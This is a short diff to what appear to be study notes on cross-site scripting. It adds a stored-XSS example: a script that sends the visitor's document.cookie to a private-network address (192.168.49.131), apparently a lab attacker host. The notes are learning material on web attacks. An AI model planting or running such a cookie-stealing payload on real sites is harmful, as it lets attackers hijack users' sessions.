@@ -14,6 +14,18 @@ Injection of scripts to the web.
 
 Most commonly seen in forums and comment area. The injected script will be stored into the server and database.
 
+```html
+<html>
+    <body>
+        <script>
+            var r = new XMLHttpRequest();
+            r.open("GET", "http://192.168.49.131" + document.cookie);
+            r.send();
+        </script>
+    </body>
+</html>
+```
+
 ## Reflected XSS
 
 Inputs that can be reflected back to the user is highly vulnerable when not properly handled.
